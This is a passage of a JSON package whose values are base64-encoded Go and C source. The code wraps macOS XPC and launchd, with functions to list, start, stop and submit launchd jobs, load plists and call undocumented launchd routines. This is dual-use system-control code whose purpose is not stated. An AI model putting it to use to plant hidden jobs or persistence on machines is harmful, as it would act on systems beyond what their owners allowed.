dGUsIDApCgkJCXJldHVybiBlbXB0eSwgZXJyb3JzLk5ldygiTWlzc2luZyBzZXJ2aWNlIG5hbWUgYW5kL29yIHBpZCBhcmd1bWVudCIpCgkJfSBlbHNlIHsKCQkJYmFzZTY0RGVjb2RlZFNlbmREYXRhLCBlcnIgOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhhcmdzLkRhdGEpCgkJCWlmIGVyciAhPSBuaWwgewoJCQkJZW1wdHkgOj0gbWFrZShbXWJ5dGUsIDApCgkJCQlyZXR1cm4gZW1wdHksIGVycgoJCQl9CgoJCQlkYXRhIDo9IERpY3R7fQoJCQllcnIgPSBqc29uLlVubWFyc2hhbChiYXNlNjREZWNvZGVkU2VuZERhdGEsICZkYXRhKQoJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCWVtcHR5IDo9IG1ha2UoW11ieXRlLCAwKQoJCQkJcmV0dXJuIGVtcHR5LCBlcnIKCQkJfQoKCQkJdmFyIG0gKlhwY01hbgoJCQltID0gTmV3KGFyZ3MuU2VydmljZU5hbWUsIDEpCgoJCQltLmNvbm4uU2VuZChkYXRhLCBmYWxzZSkKCQkJCgkJfQoJCXJldHVybiBbXWJ5dGUoIm1lc3NhZ2Ugc2VudCIpLCBuaWwKCWRlZmF1bHQ6CgkJcmV0dXJuIFtdYnl0ZSgiQ29tbWFuZCBub3Qgc3VwcG9ydGVkIiksIG5pbAoJfQoJcmV0dXJuIFtdYnl0ZSgiQ29tbWFuZCBub3Qgc3VwcG9ydGVkIiksIG5pbAp9CgpmdW5jIFhwY0xhdW5jaExpc3Qoc2VydmljZSBzdHJpbmcpIGludGVyZmFjZXt9IHsKCWlmIGxlbihzZXJ2aWNlKSA9PSAwIHsKCQlyYXcgOj0gQy5YcGNMYXVuY2hkTGlzdFNlcnZpY2VzKG5pbCkKCQlyZXN1bHQgOj0geHBjVG9HbyhyYXcpLihEaWN0KQoJCXJldHVybiByZXN1bHQKCX0gZWxzZSB7CgkJY3NlcnZpY2UgOj0gQy5DU3RyaW5nKHNlcnZpY2UpCgkJZGVmZXIgQy5mcmVlKHVuc2FmZS5Qb2ludGVyKGNzZXJ2aWNlKSkKCQlyYXcgOj0gQy5YcGNMYXVuY2hkTGlzdFNlcnZpY2VzKGNzZXJ2aWNlKQoJCXJlc3VsdCA6PSB4cGNUb0dvKHJhdykuKERpY3QpCgkJcmV0dXJuIHJlc3VsdAoJfQp9CgpmdW5jIFhwY0xhdW5jaENvbnRyb2woc2VydmljZSBzdHJpbmcsIHN0YXJ0c3RvcCBpbnQpIGludGVyZmFjZXt9IHsKCWlmIGxlbihzZXJ2aWNlKSA9PSAwIHsKCQlyZXR1cm4gRGljdHsKCQkJImVycm9yIjogInNlcnZpY2UgbmFtZSByZXF1aXJlZCIsCgkJfQoJfSBlbHNlIHsKCQljc2VydmljZSA6PSBDLkNTdHJpbmcoc2VydmljZSkKCQlkZWZlciBDLmZyZWUodW5zYWZlLlBvaW50ZXIoY3NlcnZpY2UpKQoJCWNzdGFydHN0b3AgOj0gQy5pbnQoc3RhcnRzdG9wKQoJCXJhdyA6PSBDLlhwY0xhdW5jaGRTZXJ2aWNlQ29udHJvbChjc2VydmljZSwgY3N0YXJ0c3RvcCkKCQlyZXN1bHQgOj0geHBjVG9HbyhyYXcpLihEaWN0KQoJCXJldHVybiByZXN1bHQKCX0KfQoKZnVuYyBYcGNMYXVuY2hTdWJtaXQobGFiZWwgc3RyaW5nLCBwcm9ncmFtIHN0cmluZywga2VlcGFsaXZlIGludCkgaW50ZXJmYWNle30gewoJaWYgbGVuKGxhYmVsKSA9PSAwIHx8IGxlbihwcm9ncmFtKSA9PSAwIHsKCQlyZXR1cm4gRGljdHsKCQkJImVycm9yIjogImxhYmVsIGFuZCBwcm9ncmFtIHJlcXVpcmVkIiwKCQl9Cgl9IGVsc2UgewoJCWNsYWJlbCA6PSBDLkNTdHJpbmcobGFiZWwpCgkJY3Byb2dyYW0gOj0gQy5DU3RyaW5nKHByb2dyYW0pCgkJZGVmZXIgQy5mcmVlKHVuc2FmZS5Qb2ludGVyKGNsYWJlbCkpCgkJZGVmZXIgQy5mcmVlKHVuc2FmZS5Qb2ludGVyKGNwcm9ncmFtKSkKCQlja2VlcGFsaXZlIDo9IEMuaW50KGtlZXBhbGl2ZSkKCgkJcmF3IDo9IEMuWHBjTGF1bmNoZFN1Ym1pdEpvYihjcHJvZ3JhbSwgY2xhYmVsLCBja2VlcGFsaXZlKQoJCXJlc3VsdCA6PSB4cGNUb0dvKHJhdykuKERpY3QpCgkJcmV0dXJuIHJlc3VsdAoJfQp9CgpmdW5jIFhwY0xhdW5jaFN0YXR1cyhzZXJ2aWNlIHN0cmluZykgaW50ZXJmYWNle30gewoJaWYgbGVuKHNlcnZpY2UpID09IDAgewoJCXJldHVybiBEaWN0ewoJCQkiZXJyb3IiOiAic2VydmljZSBuYW1lIHJlcXVpcmVkIiwKCQl9Cgl9IGVsc2UgewoJCWNzZXJ2aWNlIDo9IEMuQ1N0cmluZyhzZXJ2aWNlKQoJCWRlZmVyIEMuZnJlZSh1bnNhZmUuUG9pbnRlcihjc2VydmljZSkpCgkJcmF3IDo9IEMuWHBjTGF1bmNoZEdldFNlcnZpY2VTdGF0dXMoY3NlcnZpY2UpCgkJcmVzdWx0IDo9IHhwY1RvR28ocmF3KS4oRGljdCkKCQlyZXR1cm4gcmVzdWx0Cgl9Cn0KCmZ1bmMgWHBjTGF1bmNoUHJvY0luZm8ocGlkIGludCkgc3RyaW5nIHsKCgljcGlkIDo9IEMudWxvbmcocGlkKQoJcmF3IDo9IEMuWHBjTGF1bmNoZEdldFByb2NJbmZvKGNwaWQpCglmaWxlIDo9IEMuR29TdHJpbmcocmF3KQoJZGF0LCBfIDo9IGlvdXRpbC5SZWFkRmlsZShmaWxlKQoJZXJyIDo9IG9zLlJlbW92ZShmaWxlKQoJaWYgZXJyICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRmKCJVbmFibGUgdG8gcmVtb3ZlIGZpbGU6ICVzIiwgZXJyLkVycm9yKCkpCgl9CglyZXR1cm4gc3RyaW5nKGRhdCkKCn0KCmZ1bmMgWHBjTGF1bmNoTG9hZFBsaXN0KHBhdGggc3RyaW5nKSBpbnRlcmZhY2V7fSB7CglpZiBsZW4ocGF0aCkgPT0gMCB7CgkJcmV0dXJuIERpY3R7CgkJCSJlcnJvciI6ICJwYXRoIHJlcXVpcmVkIiwKCQl9Cgl9IGVsc2UgewoJCWNwYXRoIDo9IEMuQ1N0cmluZyhwYXRoKQoJCWRlZmVyIEMuZnJlZSh1bnNhZmUuUG9pbnRlcihjcGF0aCkpCgkJY2xlZ2FjeSA6PSBDLmludCgxKQoJCXJhdyA6PSBDLlhwY0xhdW5jaGRMb2FkUGxpc3QoY3BhdGgsIGNsZWdhY3kpCgkJcmVzdWx0IDo9IHhwY1RvR28ocmF3KS4oRGljdCkKCQlyZXR1cm4gcmVzdWx0Cgl9Cn0KCmZ1bmMgWHBjTGF1bmNoVW5sb2FkUGxpc3QocGF0aCBzdHJpbmcpIGludGVyZmFjZXt9IHsKCWlmIGxlbihwYXRoKSA9PSAwIHsKCQlyZXR1cm4gRGljdHsKCQkJImVycm9yIjogInBhdGggcmVxdWlyZWQiLAoJCX0KCX0gZWxzZSB7CgkJY3BhdGggOj0gQy5DU3RyaW5nKHBhdGgpCgkJZGVmZXIgQy5mcmVlKHVuc2FmZS5Qb2ludGVyKGNwYXRoKSkKCQlyYXcgOj0gQy5YcGNMYXVuY2hkVW5sb2FkUGxpc3QoY3BhdGgpCgkJcmVzdWx0IDo9IHhwY1RvR28ocmF3KS4oRGljdCkKCQlyZXR1cm4gcmVzdWx0Cgl9Cn0KCmZ1bmMgWHBjQ29ubmVjdChzZXJ2aWNlIHN0cmluZywgZWggWHBjRXZlbnRIYW5kbGVyLCBwcml2aWxlZ2VkIGludCkgWFBDIHsKCS8vIGZ1bmMgWHBjQ29ubmVjdChzZXJ2aWNlIHN0cmluZywgZWggWHBjRXZlbnRIYW5kbGVyKSBDLnhwY19jb25uZWN0aW9uX3QgewoJY3R4IDo9IHVpbnRwdHIodW5zYWZlLlBvaW50ZXIoJmVoKSkKCWhhbmRsZXJzW2N0eF0gPSBlaAoKCWNwcml2aWxlZ2VkIDo9IEMuaW50KHByaXZpbGVnZWQpCgljc2VydmljZSA6PSBDLkNTdHJpbmcoc2VydmljZSkKCWRlZmVyIEMuZnJlZSh1bnNhZmUuUG9pbnRlcihjc2VydmljZSkpCgkvLyByZXR1cm4gQy5YcGNDb25uZWN0KGNzZXJ2aWNlLCBDLnVpbnRwdHJfdChjdHgpKQoJcmV0dXJuIFhQQ3tjb25uOiBDLlhwY0Nvbm5lY3QoY3NlcnZpY2UsIEMudWludHB0cl90KGN0eCksIGNwcml2aWxlZ2VkKX0KfQoKLy9leHBvcnQgaGFuZGxlWHBjRXZlbnQKZnVuYyBoYW5kbGVYcGNFdmVudChldmVudCBDLnhwY19vYmplY3RfdCwgcCBDLnVsb25nKSB7CgkvL2xvZy5QcmludGYoImhhbmRsZVhwY0V2ZW50ICUjdiAlI3ZcbiIsIGV2ZW50LCBwKQoKCXQgOj0gQy54cGNfZ2V0X3R5cGUoZXZlbnQpCgoJZWggOj0gaGFuZGxlcnNbdWludHB0cihwKV0KCWlmIGVoID09IG5pbCB7CgkJLy9sb2cuUHJpbnRsbigibm8gaGFuZGxlciBmb3IiLCBwKQoJCXJldHVybgoJfQoKCWlmIHQgPT0gQy5UWVBFX0VSUk9SIHsKCQlpZiBldmVudCA9PSBDLkVSUk9SX0NPTk5FQ1RJT05fSU5WQUxJRCB7CgkJCS8vIFRoZSBjbGllbnQgcHJvY2VzcyBvbiB0aGUgb3RoZXIgZW5kIG9mIHRoZSBjb25uZWN0aW9uIGhhcyBlaXRoZXIKCQkJLy8gY3Jhc2hlZCBvciBjYW5jZWxsZWQgdGhlIGNvbm5lY3Rpb24uIEFmdGVyIHJlY2VpdmluZyB0aGlzIGVycm9yLAoJCQkvLyB0aGUgY29ubmVjdGlvbiBpcyBpbiBhbiBpbnZhbGlkIHN0YXRlLCBhbmQgeW91IGRvIG5vdCBuZWVkIHRvCgkJCS8vIGNhbGwgeHBjX2Nvbm5lY3Rpb25fY2FuY2VsKCkuIEp1c3QgdGVhciBkb3duIGFueSBhc3NvY2lhdGVkIHN0YXRlCgkJCS8vIGhlcmUuCgkJCS8vbG9nLlByaW50bG4oImNvbm5lY3Rpb24gaW52YWxpZCIpCgkJCWVoLkhhbmRsZUV2ZW50KG5pbCwgQ09OTkVDVElPTl9JTlZBTElEKQoJCX0gZWxzZSBpZiBldmVudCA9PSBDLkVSUk9SX0NPTk5FQ1RJT05fSU5URVJSVVBURUQgewoJCQkvL2xvZy5QcmludGxuKCJjb25uZWN0aW9uIGludGVycnVwdGVkIikKCQkJZWguSGFuZGxlRXZlbnQobmlsLCBDT05ORUNUSU9OX0lOVEVSUlVQVEVEKQoJCX0gZWxzZSBpZiBldmVudCA9PSBDLkVSUk9SX0NPTk5FQ1RJT05fVEVSTUlOQVRFRCB7CgkJCS8vIEhhbmRsZSBwZXItY29ubmVjdGlvbiB0ZXJtaW5hdGlvbiBjbGVhbnVwLgoJCQkvL2xvZy5QcmludGxuKCJjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKQoJCQllaC5IYW5kbGVFdmVudChuaWwsIENPTk5FQ1RJT05fVEVSTUlOQVRFRCkKCQl9IGVsc2UgewoJCQkvL2xvZy5QcmludGxuKCJnb3Qgc29tZSBlcnJvciIsIGV2ZW50KQoJCQllaC5IYW5kbGVFdmVudChuaWwsIGZtdC5FcnJvcmYoIiV2IiwgZXZlbnQpKQoJCX0KCX0gZWxzZSB7CgkJZWguSGFuZGxlRXZlbnQoeHBjVG9HbyhldmVudCkuKERpY3QpLCBuaWwpCgl9Cn0KCi8vIGdvVG9YcGMgY29udmVydHMgYSBnbyBvYmplY3QgdG8gYW4geHBjIG9iamVjdApmdW5jIGdvVG9YcGMobyBpbnRlcmZhY2V7fSkgQy54cGNfb2JqZWN0X3QgewoJcmV0dXJuIHZhbHVlVG9YcGMoci5WYWx1ZU9mKG8pKQp9CgovLyB2YWx1ZVRvWHBjIGNvbnZlcnRzIGEgZ28gVmFsdWUgdG8gYW4geHBjIG9iamVjdAovLwovLyBub3RlIHRoYXQgbm90IGFsbCB0aGUgdHlwZXMgYXJlIHN1cHBvcnRlZCwgYnV0IG9ubHkgdGhlIHN1YnNldCByZXF1aXJlZCBmb3IgQmx1ZWQKZnVuYyB2YWx1ZVRvWHBjKHZhbCByLlZhbHVlKSBDLnhwY19vYmplY3RfdCB7CglpZiAhdmFsLklzVmFsaWQoKSB7CgkJcmV0dXJuIG5pbAoJfQoKCXZhciB4diBDLnhwY19vYmplY3RfdAoKCXN3aXRjaCB2YWwuS2luZCgpIHsKCWNhc2Ugci5JbnQsIHIuSW50OCwgci5JbnQxNiwgci5JbnQzMiwgci5JbnQ2NDoKCQl4diA9IEMueHBjX2ludDY0X2NyZWF0ZShDLmludDY0X3QodmFsLkludCgpKSkKCgljYXNlIHIuVWludCwgci5VaW50OCwgci5VaW50MTYsIHIuVWludDMyOgoJCXh2ID0gQy54cGNfaW50NjRfY3JlYXRlKEMuaW50NjRfdCh2YWwuVWludCgpKSkKCgljYXNlIHIuU3RyaW5nOgoJCXh2ID0gQy54cGNfc3RyaW5nX2NyZWF0ZShDLkNTdHJpbmcodmFsLlN0cmluZygpKSkKCgljYXNlIHIuTWFwOgoJCXh2ID0gQy54cGNfZGljdGlvbmFyeV9jcmVhdGUobmlsLCBuaWwsIDApCgkJZm9yIF8sIGsgOj0gcmFuZ2UgdmFsLk1hcEtleXMoKSB7CgkJCXYgOj0gdmFsdWVUb1hwYyh2YWwuTWFwSW5kZXgoaykpCgkJCUMueHBjX2RpY3Rpb25hcnlfc2V0X3ZhbHVlKHh2LCBDLkNTdHJpbmcoay5TdHJpbmcoKSksIHYpCgkJCWlmIHYgIT0gbmlsIHsKCQkJCUMueHBjX3JlbGVhc2UodikKCQkJfQoJCX0KCgljYXNlIHIuQXJyYXksIHIuU2xpY2U6CgkJaWYgdmFsLlR5cGUoKSA9PSBUWVBFX09GX1VVSUQgewoJCQkvLyBBcnJheSBvZiBieXRlcwoJCQl2YXIgdXVpZCBbMTZdYnl0ZQoJCQlyLkNvcHkoci5WYWx1ZU9mKHV1aWRbOl0pLCB2YWwpCgkJCXh2ID0gQy54cGNfdXVpZF9jcmVhdGUoQy5wdHJfdG9fdXVpZCh1bnNhZmUuUG9pbnRlcigmdXVpZFswXSkpKQoJCX0gZWxzZSBpZiB2YWwuVHlwZSgpID09IFRZUEVfT0ZfQllURVMgewoJCQkvLyBzbGljZSBvZiBieXRlcwoJCQl4diA9IEMueHBjX2RhdGFfY3JlYXRlKHVuc2FmZS5Qb2ludGVyKHZhbC5Qb2ludGVyKCkpLCBDLnNpemVfdCh2YWwuTGVuKCkpKQoJCX0gZWxzZSB7CgkJCXh2ID0gQy54cGNfYXJyYXlfY3JlYXRlKG5pbCwgMCkKCQkJbCA6PSB2YWwuTGVuKCkKCgkJCWZvciBpIDo9IDA7IGkgPCBsOyBpKysgewoJCQkJdiA6PSB2YWx1ZVRvWHBjKHZhbC5JbmRleChpKSkKCQkJCUMueHBjX2FycmF5X2FwcGVuZF92YWx1ZSh4diwgdikKCQkJCWlmIHYgIT0gbmlsIHsKCQkJCQlDLnhwY19yZWxlYXNlKHYpCgkJCQl9CgkJCX0KCQl9CgoJY2FzZSByLkludGVyZmFjZSwgci5QdHI6CgkJeHYgPSB2YWx1ZVRvWHBjKHZhbC5FbGVtKCkpCiAKCWRlZmF1bHQ6CgkJbG9nLkZhdGFsZigidW5zdXBwb3J0ZWQgJSN2IiwgdmFsLlN0cmluZygpKQoJfQoKCXJldHVybiB4dgp9CgovL2V4cG9ydCBhcnJheVNldApmdW5jIGFycmF5U2V0KHUgQy51aW50cHRyX3QsIGkgQy5pbnQsIHYgQy54cGNfb2JqZWN0X3QpIHsKCWEgOj0gKigqQXJyYXkpKHVuc2FmZS5Qb2ludGVyKHVpbnRwdHIodSkpKQoJYVtpXSA9IHhwY1RvR28odikKfQoKLy9leHBvcnQgZGljdFNldApmdW5jIGRpY3RTZXQodSBDLnVpbnRwdHJfdCwgayAqQy5jaGFyLCB2IEMueHBjX29iamVjdF90KSB7CglkIDo9ICooKkRpY3QpKHVuc2FmZS5Qb2ludGVyKHVpbnRwdHIodSkpKQoJZFtDLkdvU3RyaW5nKGspXSA9IHhwY1RvR28odikKfQoKLy8geHBjVG9HbyBjb252ZXJ0cyBhbiB4cGMgb2JqZWN0IHRvIGEgZ28gb2JqZWN0Ci8vCi8vIG5vdGUgdGhhdCBub3QgYWxsIHRoZSB0eXBlcyBhcmUgc3VwcG9ydGVkLCBidXQgb25seSB0aGUgc3Vic2V0IHJlcXVpcmVkIGZvciBCbHVlZApmdW5jIHhwY1RvR28odiBDLnhwY19vYmplY3RfdCkgaW50ZXJmYWNle30gewoJdCA6PSBDLnhwY19nZXRfdHlwZSh2KQoKCXN3aXRjaCB0IHsKCWNhc2UgQy5UWVBFX0FSUkFZOgoJCWEgOj0gbWFrZShBcnJheSwgQy5pbnQoQy54cGNfYXJyYXlfZ2V0X2NvdW50KHYpKSkKCQlwIDo9IHVpbnRwdHIodW5zYWZlLlBvaW50ZXIoJmEpKQoJCUMuWHBjQXJyYXlBcHBseShDLnVpbnRwdHJfdChwKSwgdikKCQlyZXR1cm4gYQoKCWNhc2UgQy5UWVBFX0RBVEE6CgkJcmV0dXJuIEMuR29CeXRlcyhDLnhwY19kYXRhX2dldF9ieXRlc19wdHIodiksIEMuaW50KEMueHBjX2RhdGFfZ2V0X2xlbmd0aCh2KSkpCgoJY2FzZSBDLlRZUEVfRElDVDoKCQlkIDo9IG1ha2UoRGljdCkKCQlwIDo9IHVpbnRwdHIodW5zYWZlLlBvaW50ZXIoJmQpKQoJCUMuWHBjRGljdEFwcGx5KEMudWludHB0cl90KHApLCB2KQoJCXJldHVybiBkCgoJY2FzZSBDLlRZUEVfSU5UNjQ6CgkJcmV0dXJuIGludDY0KEMueHBjX2ludDY0X2dldF92YWx1ZSh2KSkKCgljYXNlIEMuVFlQRV9TVFJJTkc6CgkJcmV0dXJuIEMuR29TdHJpbmcoQy54cGNfc3RyaW5nX2dldF9zdHJpbmdfcHRyKHYpKQoKCWNhc2UgQy5UWVBFX1VVSUQ6CgkJYSA6PSBbMTZdYnl0ZXt9CgkJQy5YcGNVVUlER2V0Qnl0ZXModW5zYWZlLlBvaW50ZXIoJmEpLCB2KQoJCXJldHVybiBVVUlEKGEpCgoJY2FzZSBDLlRZUEVfRVJST1I6CgkJZCA6PSBtYWtlKERpY3QpCgkJcCA6PSB1aW50cHRyKHVuc2FmZS5Qb2ludGVyKCZkKSkKCQlDLlhwY0RpY3RBcHBseShDLnVpbnRwdHJfdChwKSwgdikKCQlyZXR1cm4gZAoJY2FzZSBDLlRZUEVfQk9PTDoKCQlsb2cuUHJpbnRmKCJSZWNlaXZlZCBib29sIHhwYyB0eXBlOiAlI3YiLCB2KQoKCWNhc2UgQy5UWVBFX0NPTk5FQ1RJT046CgkJbG9nLlByaW50ZigiUmVjZWl2ZWQgY29ubmVjdGlvbiB4cGMgdHlwZTogJSN2IiwgdikKCgljYXNlIEMuVFlQRV9GRDoKCQlsb2cuUHJpbnRmKCJSZWNlaXZlZCBmaWxlIGRlc2NyaXB0b3IgeHBjIHR5cGU6ICUjdiIsIHYpCgljYXNlIEMuVFlQRV9OVUxMOgoJCWxvZy5QcmludGYoIlJlY2VpdmVkIG51bGwgeHBjIHR5cGU6ICUjdiIsIHYpCgoJY2FzZSBDLlRZUEVfU0hNRU06CgkJbG9nLlByaW50ZigiUmVjZWl2ZWQgc2hhcmVkIG1lbW9yeSB4cGMgdHlwZTogJSN2IiwgdikKCWRlZmF1bHQ6CgkJbG9nLkZhdGFsZigidW5leHBlY3RlZCB0eXBlICUjdiwgdmFsdWUgJSN2IiwgdCwgdikKCX0KCglyZXR1cm4gbmlsCn0KCi8vIHhwY19yZWxlYXNlIGlzIG5lZWRlZCBieSB0ZXN0cywgc2luY2UgdGhleSBjYW4ndCB1c2UgQ0dPCmZ1bmMgeHBjX3JlbGVhc2UoeHYgQy54cGNfb2JqZWN0X3QpIHsKCUMueHBjX3JlbGVhc2UoeHYpCn0KCi8vIHRoaXMgaXMgdXNlZCB0byBjaGVjayB0aGUgT1MgdmVyc2lvbgoKdHlwZSBVdHNuYW1lIHN0cnVjdCB7CglTeXNuYW1lICBzdHJpbmcKCU5vZGVuYW1lIHN0cmluZwoJUmVsZWFzZSAgc3RyaW5nCglWZXJzaW9uICBzdHJpbmcKCU1hY2hpbmUgIHN0cmluZwp9CgpmdW5jIFVuYW1lKHV0c25hbWUgKlV0c25hbWUpIGVycm9yIHsKCXZhciBjc3RydWN0IEMuc3RydWN0X3V0c25hbWUKCWlmIGVyciA6PSBDLnVuYW1lKCZjc3RydWN0KTsgZXJyICE9IDAgewoJCXJldHVybiBlcnJvcnMuTmV3KCJ1dHNuYW1lIGVycm9yIikKCX0KCgkvLyBYWFg6IHRoaXMgbWF5IGNyYXNoIGlmIGFueSB2YWx1ZSBpcyBleGFjdGx5IDI1NiBjaGFyYWN0ZXJzIChubyAwIHRlcm1pbmF0b3IpCgl1dHNuYW1lLlN5c25hbWUgPSBDLkdvU3RyaW5nKCZjc3RydWN0LnN5c25hbWVbMF0pCgl1dHNuYW1lLk5vZGVuYW1lID0gQy5Hb1N0cmluZygmY3N0cnVjdC5ub2RlbmFtZVswXSkKCXV0c25hbWUuUmVsZWFzZSA9IEMuR29TdHJpbmcoJmNzdHJ1Y3QucmVsZWFzZVswXSkKCXV0c25hbWUuVmVyc2lvbiA9IEMuR29TdHJpbmcoJmNzdHJ1Y3QudmVyc2lvblswXSkKCXV0c25hbWUuTWFjaGluZSA9IEMuR29TdHJpbmcoJmNzdHJ1Y3QubWFjaGluZVswXSkKCglyZXR1cm4gbmlsCn0K"
            },
            {
              "xpc_wrapper_darwin.h": "I2lmbmRlZiBfWFBDX1dSQVBQRVJfSF8KI2RlZmluZSBfWFBDX1dSQVBQRVJfSF8KCiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDx4cGMveHBjLmg+CiNpbmNsdWRlIDx4cGMvY29ubmVjdGlvbi5oPgojaW5jbHVkZSA8c3lzL3V0c25hbWUuaD4KI2luY2x1ZGUgPGxhdW5jaC5oPgoKZXh0ZXJuIHhwY190eXBlX3QgVFlQRV9FUlJPUjsKZXh0ZXJuIHhwY190eXBlX3QgVFlQRV9BUlJBWTsKZXh0ZXJuIHhwY190eXBlX3QgVFlQRV9EQVRBOwpleHRlcm4geHBjX3R5cGVfdCBUWVBFX0RJQ1Q7CmV4dGVybiB4cGNfdHlwZV90IFRZUEVfSU5UNjQ7CmV4dGVybiB4cGNfdHlwZV90IFRZUEVfU1RSSU5HOwpleHRlcm4geHBjX3R5cGVfdCBUWVBFX1VVSUQ7CmV4dGVybiB4cGNfdHlwZV90IFRZUEVfQk9PTDsKZXh0ZXJuIHhwY190eXBlX3QgVFlQRV9EQVRFOwpleHRlcm4geHBjX3R5cGVfdCBUWVBFX0ZEOwpleHRlcm4geHBjX3R5cGVfdCBUWVBFX0NPTk5FQ1RJT047CmV4dGVybiB4cGNfdHlwZV90IFRZUEVfTlVMTDsKZXh0ZXJuIHhwY190eXBlX3QgVFlQRV9TSE1FTTsKZXh0ZXJuIHhwY19vYmplY3RfdCBFUlJPUl9DT05ORUNUSU9OX0lOVkFMSUQ7CmV4dGVybiB4cGNfb2JqZWN0X3QgRVJST1JfQ09OTkVDVElPTl9JTlRFUlJVUFRFRDsKZXh0ZXJuIHhwY19vYmplY3RfdCBFUlJPUl9DT05ORUNUSU9OX1RFUk1JTkFURUQ7CgpleHRlcm4geHBjX2Nvbm5lY3Rpb25fdCBYcGNDb25uZWN0KGNoYXIgKiwgdWludHB0cl90LCBpbnQpOwpleHRlcm4gdm9pZCBYcGNTZW5kTWVzc2FnZSh4cGNfY29ubmVjdGlvbl90LCB4cGNfb2JqZWN0X3QsIGJvb2wsIGJvb2wpOwpleHRlcm4gdm9pZCBYcGNBcnJheUFwcGx5KHVpbnRwdHJfdCwgeHBjX29iamVjdF90KTsKZXh0ZXJuIHZvaWQgWHBjRGljdEFwcGx5KHVpbnRwdHJfdCwgeHBjX29iamVjdF90KTsKZXh0ZXJuIHZvaWQgWHBjVVVJREdldEJ5dGVzKHZvaWQgKiwgeHBjX29iamVjdF90KTsKZXh0ZXJuIHhwY19vYmplY3RfdCBYcGNMYXVuY2hkTGlzdFNlcnZpY2VzKGNoYXIgKik7CmV4dGVybiB4cGNfb2JqZWN0X3QgWHBjTGF1bmNoZFNlcnZpY2VDb250cm9sKGNoYXIgKiwgaW50KTsKZXh0ZXJuIHhwY19vYmplY3RfdCBYcGNMYXVuY2hkU3VibWl0Sm9iKGNoYXIgKiwgY2hhciAqLCBpbnQpOwpleHRlcm4geHBjX29iamVjdF90IFhwY0xhdW5jaGRHZXRTZXJ2aWNlU3RhdHVzKGNoYXIgKik7CmV4dGVybiB4cGNfb2JqZWN0X3QgWHBjTGF1bmNoZExvYWRQbGlzdChjaGFyICosIGludCk7CmV4dGVybiBjaGFyKiBYcGNMYXVuY2hkR2V0UHJvY0luZm8odW5zaWduZWQgbG9uZyk7CmV4dGVybiB4cGNfb2JqZWN0X3QgWHBjTGF1bmNoZFVubG9hZFBsaXN0KGNoYXIgKik7CgpleHRlcm4gdm9pZCAqb2JqY19yZXRhaW4gKHZvaWQgKik7CmV4dGVybiBpbnQgeHBjX3BpcGVfcm91dGluZSAoeHBjX29iamVjdF90ICosIHhwY19vYmplY3RfdCAqLCB4cGNfb2JqZWN0X3QgKiopOwpleHRlcm4gY2hhciAqeHBjX3N0cmVycm9yIChpbnQpOwpleHRlcm4gaW50IGNzcl9jaGVjayAoaW50IHdoYXQpOwoKLy8gVGhpcyBpcyB1bmRvY3VtZW50ZWQsIGJ1dCBzb29vb28gdXNlZnVsIDopCmV4dGVybiBtYWNoX3BvcnRfdCB4cGNfZGljdGlvbmFyeV9jb3B5X21hY2hfc2VuZCh4cGNfb2JqZWN0X3QsIGNoYXIgKmtleSk7CgoKLy8gU29tZSBvZiB0aGUgcm91dGluZSAjcyBsYXVuY2hkIHJlY29nbml6ZXMuIFRoZXJlIGFyZSBxdWl0ZSBhIGZldyBzdWJzeXN0ZW1zCi8vIChzdGF5IHR1bmVkIGZvciBNT1hpSSAyIC0gbGlzdCBpcyB0b28gbG9uZyBmb3Igbm93KQoKI2RlZmluZSBST1VUSU5FX0RFQlVHCQkweDJjMQkvLyA3MDUKI2RlZmluZSBST1VUSU5FX1NVQk1JVAkJMTAwCiNkZWZpbmUgUk9VVElORV9CTEFNRQkJMHgyYzMgCS8vIDcwNwojZGVmaW5lIFJPVVRJTkVfRFVNUF9QUk9DRVNTCTB4MmM0CS8vIDcwOAojZGVmaW5lIFJPVVRJTkVfUlVOU1RBVFMJMHgyYzUJLy8gNzA5CiNkZWZpbmUgUk9VVElORV9MT0FECQkweDMyMAkvLyA4MDAKI2RlZmluZSBST1VUSU5FX1VOTE9BRAkJMHgzMjEJLy8gODAxCiNkZWZpbmUgUk9VVElORV9MT09LVVAJCTB4MzI0CiNkZWZpbmUgUk9VVElORV9FTkFCTEUJCTB4MzI4CS8vIDgwOAojZGVmaW5lIFJPVVRJTkVfRElTQUJMRQkJMHgzMjkgICAvLyA4MDkKI2RlZmluZSBST1VUSU5FX1NUQVRVUwkJMHgzMmIgICAvLyA4MTEKCiNkZWZpbmUgUk9VVElORV9LSUxMCQkweDMyYwojZGVmaW5lIFJPVVRJTkVfVkVSU0lPTgkJMHgzM2MKI2RlZmluZSBST1VUSU5FX1BSSU5UX0NBQ0hFCTB4MzNjCiNkZWZpbmUgUk9VVElORV9QUklOVAkJMHgzM2MJLy8gYWxzbyBWRVJTSU9OLi4sIGNhY2hlLi4KI2RlZmluZSBST1VUSU5FX1JFQk9PVF9VU0VSU1BBQ0UJODAzIC8vIDEwLjExLzkuMCBvbmx5CiNkZWZpbmUgUk9VVElORV9TVEFSVAkJMHgzMmQJLy8gODEzCiNkZWZpbmUgUk9VVElORV9TVE9QCQkweDMyZQkvLyA4MTQKI2RlZmluZSBST1VUSU5FX0xJU1QJCTB4MzJmCS8vIDgxNQojZGVmaW5lIFJPVVRJTkVfU0VURU5WCQkweDMzMwkvLyA4MTkKI2RlZmluZSBST1VUSU5FX0dFVEVOVgkJMHgzMzQgIC8vIDgyMAojZGVmaW5lIFJPVVRJTkVfUkVTT0xWRV9QT1JUCQkweDMzNgojZGVmaW5lIFJPVVRJTkVfRVhBTUlORQkJMHgzM2EKI2RlZmluZSBST1VUSU5FX0xJTUlUCQkweDMzOQkvLyA4MjUKI2RlZmluZSBST1VUSU5FX0RVTVBfRE9NQUlOCTB4MzNjCS8vIDgyOAojZGVmaW5lIFJPVVRJTkVfQVNVU0VSCTB4MzQ0CS8vIC4uLgojZGVmaW5lIFJPVVRJTkVfRFVNUF9TVEFURQkweDM0MgkvLyAwMzQKI2RlZmluZSBST1VUSU5FX0RVTVBKUENBVEVHT1JZCQkweDM0NQkvLyB3YXMgMzQ2IGluIGlPUyA5Ci8vIHRoZSBpbnB1dCB0eXBlIGZvciB4cGNfdXVpZF9jcmVhdGUgc2hvdWxkIGJlIHV1aWRfdCBidXQgQ0dPIGluc3Rpc3RzIG9uIHVuc2lnbmVkIGNoYXIgKgovLyB0eXBlZGVmI